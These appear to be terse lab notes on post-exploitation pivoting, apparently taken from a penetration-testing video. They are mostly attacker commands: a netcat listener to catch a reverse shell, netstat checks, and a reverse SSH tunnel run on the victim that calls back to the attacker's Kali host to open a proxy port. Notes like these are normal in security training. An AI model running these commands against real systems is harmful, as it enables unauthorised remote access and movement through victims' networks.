(ATTACKER) nc -lvp 55556

*upgrade shell [2:26]
Pivot post exploitation

(ATTACKER)(TERM 1) netstat -natp (SHOULD SEE YOUR PORT AND ESTABLISHED)
(ATTACKER)(TERM 1) netstat -natp | grep LISTEN (OUT OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)

after catching app 1 (MY PORT 55556) SSH

(VICTIM) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
if it states port fowarding failed it means you alrady have ypur proxy open
(VICTIM) should be promted a password
